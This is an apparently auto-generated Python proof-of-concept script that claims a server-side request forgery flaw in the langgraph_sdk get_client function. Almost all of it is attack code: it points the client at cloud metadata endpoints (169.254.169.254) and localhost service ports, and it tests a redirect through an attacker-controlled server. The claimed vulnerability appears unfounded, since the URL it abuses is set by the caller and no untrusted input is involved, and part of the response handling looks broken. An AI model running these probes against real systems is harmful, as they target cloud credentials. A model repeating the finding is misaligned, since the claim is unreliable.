#!/usr/bin/env python3
# PoC for langgraph_sdk-0.4.2 (/tmp/langgraph_sdk-0.4.2)
# Path: ssrf-006
# Sink: get_client
# Auto-generated — run with: python3 ssrf_url_http_client_get_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via langgraph_sdk get_client (v0.4.2)

Vulnerability: The get_client() function accepts a user-controlled 'url' parameter
and passes it directly to httpx.AsyncClient as base_url without validation.
The client follows redirects by default, allowing SSRF to internal services.

This PoC demonstrates:
1. SSRF to cloud metadata endpoint (169.254.169.254)
2. SSRF to internal services (127.0.0.1)
3. Redirect-based SSRF bypass

Usage:
    python3 poc_ssrf.py [target_url]

    Default target: http://localhost:8123 (local LangGraph server)
    Set target to your own server to test redirect-based SSRF.

Requirements:
    pip install httpx langgraph-sdk==0.4.2
"""

import asyncio
import sys
import httpx
from langgraph_sdk import get_client

# Default target - change this to your test server
DEFAULT_TARGET = "http://localhost:8123"

# Internal targets to probe (cloud metadata, localhost services)
INTERNAL_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS/GCP metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure metadata
    "http://127.0.0.1:8080/",  # Common internal service
    "http://127.0.0.1:5000/",  # Flask dev server
    "http://127.0.0.1:3000/",  # Node.js dev server
]

async def test_ssrf(target_url: str, internal_url: str) -> None:
    """
    Attempt SSRF by creating a client with an internal URL as base.
    The client will make requests to the internal service.
    """
    print(f"\n[*] Testing SSRF to: {internal_url}")
    try:
        # Create client with internal URL as base
        client = get_client(url=internal_url, timeout=5.0)
        
        # Try to make a request - this will go to the internal service
        # We use a non-existent endpoint to see what happens
        try:
            response = await client.assistants.get()
            print(f"[+] SUCCESS - Got response from internal service:")
            print(f"    Status: {response.status_code}")
            print(f"    Body (first 500 chars): {str(response)[:500]}")
        except Exception as e:
            error_str = str(e)
            if "connect" in error_str.lower() or "timeout" in error_str.lower():
                print(f"[-] Connection failed (expected if service not running): {error_str[:100]}")
            else:
                print(f"[!] Unexpected error: {error_str[:200]}")
        
        await client.aclose()
    except Exception as e:
        print(f"[-] Failed to create client: {str(e)[:200]}")

async def test_redirect_ssrf(target_url: str) -> None:
    """
    Test SSRF via redirect: Create client with attacker-controlled server
    that redirects to internal service.
    """
    print(f"\n[*] Testing redirect-based SSRF to: {target_url}")
    print("    (Requires attacker-controlled server that redirects to internal)")
    
    # This simulates what would happen if an attacker controls a server
    # that redirects to an internal endpoint
    redirect_url = f"{target_url}/redirect-to-internal"
    
    try:
        client = get_client(url=redirect_url, timeout=5.0)
        try:
            response = await client.assistants.get()
            print(f"[+] SUCCESS - Followed redirect to internal service:")
            print(f"    Status: {response.status_code}")
            print(f"    Body (first 500 chars): {str(response)[:500]}")
        except Exception as e:
            print(f"[-] Redirect test failed: {str(e)[:200]}")
        
        await client.aclose()
    except Exception as e:
        print(f"[-] Failed to create client: {str(e)[:200]}")

async def main():
    # Get target URL from command line or use default
    target_url = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET
    print(f"[*] Target URL: {target_url}")
    print("[*] This PoC demonstrates SSRF via langgraph_sdk get_client")
    print("[*] Testing various internal endpoints...")
    
    # Test direct SSRF to internal services
    for internal_url in INTERNAL_TARGETS:
        await test_ssrf(target_url, internal_url)
    
    # Test redirect-based SSRF
    await test_redirect_ssrf(target_url)
    
    print("\n[*] SSRF PoC completed.")
    print("[*] If any internal services responded, the vulnerability is confirmed.")
    print("[*] Note: Most internal services will not be running, so connection")
    print("    errors are expected. The vulnerability is in the code path itself.")

if __name__ == "__main__":
    asyncio.run(main())
